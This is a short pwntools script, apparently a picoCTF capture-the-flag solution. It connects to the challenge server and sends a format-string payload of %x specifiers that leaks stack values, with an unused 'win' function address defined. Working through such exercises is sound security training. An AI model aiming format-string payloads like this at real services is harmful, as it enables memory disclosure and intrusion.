from pwn import*

p = remote("saturn.picoctf.net", 64075)
#p = process("./vuln")
#gdb.attach(p,api=True)

win = 0x08049296
payload = b"%36$x%37$x%38$x%39$x%40$x%41$x%42$x%43$x%44$x%45$x"

p.sendline(payload)
p.interactive()
